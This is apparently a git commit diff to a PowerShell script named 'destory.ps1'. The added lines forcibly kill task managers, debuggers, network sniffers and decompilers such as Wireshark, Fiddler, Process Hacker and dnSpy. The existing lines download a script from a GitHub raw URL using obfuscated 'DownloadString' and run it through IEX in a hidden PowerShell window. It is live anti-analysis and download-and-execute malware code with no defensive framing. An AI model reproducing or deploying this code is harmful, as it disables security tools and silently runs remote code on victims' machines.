62e585192080cf77a3f72f5c94d914fd168f78d4
43a1723 <hai1723notgay@gmail.com>
2025-04-10 13:06:29 +0700

    Update destory.ps1

--- s/destory.ps1
+++ s/destory.ps1
@@ -1,3 +1,12 @@
+$2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')
+
+foreach ($prg in $2kill) {
+    $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
+    if ($rprc) {
+        Stop-Process -Name $prg -Force 
+        Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
+    }
+}
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
